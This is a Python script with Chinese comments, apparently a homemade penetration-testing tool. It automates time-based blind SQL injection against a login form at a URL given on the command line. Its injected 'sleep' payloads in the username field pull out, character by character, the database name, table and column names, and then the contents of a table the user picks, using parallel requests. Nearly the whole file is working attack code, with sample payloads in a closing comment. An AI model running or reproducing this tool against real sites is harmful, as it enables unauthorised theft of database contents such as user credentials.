import requests
import argparse
from loguru import logger
import time
import collections
import tqdm  # 进度条库
import multiprocessing as mp

core_num=8
value = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!{}"
'''
haveget:
        length:数据库长度
                curr:当前数据库长度
                t0:table数
                t1:table1长度
                t2:table2长度
                table:
                    c0:列数
                    c1:第1列长度
                    ………………     
                    
                
        database:数据库名字
                curr:当前数据库名字
        table:表名字
                curr:当前数据库内表
                    0:一共有几个表
                    1:第一个表名字
                    2:第二个表名字
                    ………………     
        column:列名字
                [table]:当前表
                        0:一共有几列
                        1:第一列
                        2:第二列
                        ………………
        data:
            [table]:表名
                    [column]:列名
                            0:一共有几行
                            1:第一行数据
                            2:第二行数据
                            ………………
'''
haveget = collections.defaultdict(dict)

# 获取数据库名长度
def get_length_database():
    # 该字典存储爆破到的数据库的所有信息
    global haveget
    for n in range(1, 100):
        # 一般payload
        # 这里存在优化点，用户名不一定是test
        payload = "test' and if((length((database()))={0}),sleep(2),1) #".format(n)
        # 传参表，考虑这里也需要优化，因为不一定都是username 和 password
        # 优化考虑从post表单里得到参数信息
        data = {"username": payload, "password": '123'}
        # 开始时间
        start_time = time.time()
        # post传参
        requests.post(url, data=data)
        # 结束时间
        end_time = time.time()
        use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
        if use_time > 1.8:
            print("...... database's length is :" + str(n))
            # 字典储存
            haveget['length'] = {'curr': n}
            return

def check_database(parameter):
    n,v,url=parameter
    payload = "test' and if(ascii(substr(database(),{0},1))={1},sleep(3),null)#".format(n, ord(v))
    data = {"username": payload, "password": '123'}
    start_time = time.time()
    requests.post(url, data=data)
    end_time = time.time()
    use_time = end_time - start_time
    if use_time > 1.8:return True
    return False

# 获取数据库名
def get_database(url):
    global haveget
    length = haveget['length']['curr'] + 1
    arg1 = [(i, j,url) for i in range(1, length) for j in value]
    with mp.Pool(core_num) as p:
        res=list(tqdm.tqdm(p.imap(check_database, arg1), total=len(arg1)))
    ans = [''] * 100
    for i in range(len(res)):
        if res[i]: ans[arg1[i][0]] = arg1[i][1]
    haveget['database'] = {'curr': ''.join(ans)}

# 获取数表数量
def get_table_num():
    '''
    获取数据库表单数
    :return:
    '''
    # 该字典存储爆破到的数据库的所有信息
    global haveget
    for n in range(1, 100):
        # 一般payload
        # 这里存在优化点，用户名不一定是test
        payload = "test' and if((select count(*) from information_schema.tables where table_schema=database())={0},sleep(2),1) #".format(n)
        # 传参表，考虑这里也需要优化，因为不一定都是username 和 password
        # 优化考虑从post表单里得到参数信息
        data = {"username": payload, "password": '123'}
        # 开始时间
        start_time = time.time()
        # post传参
        requests.post(url, data=data)
        # 结束时间
        end_time = time.time()
        use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
        if use_time > 1.8:
            print("...... table num is:" + str(n))
            # 字典储存
            haveget['length'] = {'t0': n}
            break

# 获取表长度
def get_length_table():
    global haveget
    for i in range(haveget['length']['t0']):
        for n in range(1, 100):
            payload = "test' and if((select length(table_name) from information_schema.tables where table_schema=database() limit {0},1)={1},sleep(2),1) #".format(i,n)
            data = {"username": payload, "password": '123'}
            start_time = time.time()
            requests.post(url, data=data)
            end_time = time.time()
            use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
            if use_time > 1.8:
                print("...... table {0} length is:".format(i+1) + str(n))
                haveget['length']['t{}'.format(i+1)] = n
                break

# 判断表字符
def check_table(parameter):
    i,j,v,url=parameter
    # 一般payload，优化点与前述相同
    payload = "test' and if(ascii(substr((select table_name from information_schema.tables where table_schema =database() limit {0},1),{1},1))={2},sleep(2),null) #".format(i, j, ord(v))
    data = {"username": payload, "password": '123'}
    start_time = time.time()
    requests.post(url, data=data)
    end_time = time.time()
    use_time = end_time - start_time
    if use_time > 1.8:return True
    return False

# 获取表名
def get_table(url):
    global haveget
    haveget['table']['curr'] = {}
    arg1=[(i,j,v,url) for i in range(haveget['length']['t0']) for j in range(1,haveget['length']['t{}'.format(i+1)]+1) for v in value]
    with mp.Pool(core_num) as p:
        res=list(tqdm.tqdm(p.imap(check_table, arg1), total=len(arg1)))
    ans = []
    for i in range(haveget['length']['t0']):
        ans.append(['']*(haveget['length']['t{}'.format(i+1)]+1))
    for i in range(len(res)):
        if res[i]:
            ans[arg1[i][0]][arg1[i][1]] = arg1[i][2]
    for i in range(haveget['length']['t0']):
        haveget['table']['curr'][i+1] = ''.join(ans[i])
    haveget['table']['curr'][0] = haveget['length']['t0']

# 获取表的列数
def get_column_num():
    global haveget
    for i in range(haveget['table']['curr'][0]):
        table=haveget['table']['curr'][i+1]
        for n in range(1, 100):
            payload = "test' and if((select count(*) from information_schema.columns where table_name='{0}')={1},sleep(2),1) #".format(table,n)
            data = {"username": payload, "password": '123'}
            start_time = time.time()
            requests.post(url, data=data)
            end_time = time.time()
            use_time = end_time - start_time
            if use_time > 1.8:
                print("......the column num of {0} table is:".format(i+1) + str(n))
                haveget['length'][table] = {'c0': n}
                break

# 获取列名
def get_column():
    # 列的标记

    global haveget

    columnname = ''
    # 优化点，凡是写死curr的地方都要优化
    for i in range(1, haveget['table']['curr'][0] + 1):
        table = haveget['table']['curr'][i]
        haveget['column'][table] = {}
        currColumnIndex = 1
        for j in range(100):
            columnNumGetComplete = True
            for i in range(1, 1000):
                columnNameGetComplete = True
                for v in value:

                    payload = "test' and if(ascii(substr((select column_name from information_schema.columns where table_name='{0}' limit {1}, 1), {2},1))={3},sleep(2),null) #".format(
                        table, j, i, ord(v))
                    data = {"username": payload, "password": '123'}
                    start_time = time.time()
                    requests.post(url, data=data)
                    end_time = time.time()
                    use_time = end_time - start_time
                    if use_time > 1.5:
                        columnNameGetComplete = False
                        columnname += v
                        print("\r", "......" + columnname, end="", flush=True)
                        break
                if columnNameGetComplete:
                    if columnname != '':
                        columnNumGetComplete = False
                        haveget['column'][table][currColumnIndex] = columnname
                        print("\r", ".....{0} column {1} name is :".format(table, currColumnIndex) + columnname,
                              flush=True)
                        currColumnIndex += 1
                    columnname = ''
                    break
            if columnNumGetComplete: break
        haveget['column'][table][0] = currColumnIndex - 1


# 获取数据
def get_data():
    global haveget

    '''---------------------------------处理选择--------------------------------------'''

    print('-------表单-------')
    for k, v in haveget['table']['curr'].items():
        if k != 0: print(str(k) + ': ' + v)
    print('-------表单-------\n')
    id = int(input('选择要爆破的表单编号:'))
    print('\n-------列名-------')
    try:
        for k, v in haveget['column'][haveget['table']['curr'][id]].items():
            if k != 0:
                print(str(k) + ': ' + v)
    except:
        print('抱歉，输入表单编号不存在！')
        exit()
    print('-------列名-------\n')

    table = haveget['table']['curr'][id]

    id = int(input('选择要爆破的列编号:'))
    print()
    try:
        column = haveget['column'][table][id]
    except:
        print('抱歉，输入列编号不存在！')
        exit()

    '''---------------------------------处理选择--------------------------------------'''

    try:
        haveget['data'][table][column][0]
    except:
        haveget['data'] = {table: {column: {0: 0}}}

    '''---------------------------------爆破数据--------------------------------------'''
    retdata = ''
    currRowIndex = 1
    # 最多能扫描到行
    for j in range(100):
        # 当前列扫描完毕标志
        columnDataGetComplete = True
        # 最多能扫描行内存储数据长度为1000
        for i in range(1, 1000):
            # 当前行数据扫描完毕标志
            rowDataGetComplete = True
            # 遍历字典
            for v in value:
                # 一般payload，优化点与前述相同
                payload = "test' and if(ascii(substr((select {0} from {1} limit {2}, 1), {3},1))={4},sleep(2),null) #".format(
                    column, table, j, i, ord(v))
                data = {"username": payload, "password": '123'}
                start_time = time.time()
                requests.post(url, data=data)
                end_time = time.time()
                use_time = end_time - start_time
                if use_time > 1.5:
                    # 如果当前行还能获取到数据，则该行数据还未获取完毕
                    rowDataGetComplete = False
                    retdata += v
                    print("\r", "......" + retdata, end="", flush=True)
                    break
            # 如果当前行数据获取完毕，判断当前获取的数据是否为空，不为空则说明还有行数据未获取
            if rowDataGetComplete:
                if retdata != '':
                    columnDataGetComplete = False
                    # 将获取到的数据存入当前数据库中
                    print("\r", ".....the line {0} of {1}-{2} data is :".format(currRowIndex, table, column) + retdata,
                          flush=True)
                    haveget['data'][table][column][currRowIndex] = retdata
                    currRowIndex += 1
                retdata = ''
                break
        # 如果当前数据库全部表单获取完毕，break
        if columnDataGetComplete: break
    haveget['data'][table][column][0] = currRowIndex - 1
    return


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='渗透测试工具测试版！',
                                     prog='渗透测试工具！')
    parser.add_argument('--url', type=str, help='输入目标测试网站url！')
    parser.add_argument('--gpmode', type=str, default='post', help='输入传参模式：post/get')
    parser.add_argument('--mode', type=str, default='time', help='sql注入模式：bool/time/error/union/stack')
    parser.add_argument('--get', type=str, default='table',
                        help='输入要爆破出的数据库信息：database/table/columninfo/infomation/all')
    args = parser.parse_args()

    url = args.url

    if args.get == 'all':
        logger.info('{0}  正在获取当前数据库名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_length_database()
        logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_database(url)
        print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
        logger.info('{0}  正在获取当前数据库内表单数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_table_num()
        logger.info('{0}  正在获取表单名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_length_table()
        logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_table(url)
        logger.info('{0}  正在获取当前各表列数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_column_num()
        logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_column()
        logger.info('{0}  获取数据......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
        get_data()
        logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))



'''
payload:
表单数:test' and if((select count(*) from information_schema.tables where table_schema=database())=1,sleep(2),1) #
列数:test' and if((select count(*) from information_schema.columns where table_name='pinfo')=4,sleep(2),1) #
'''

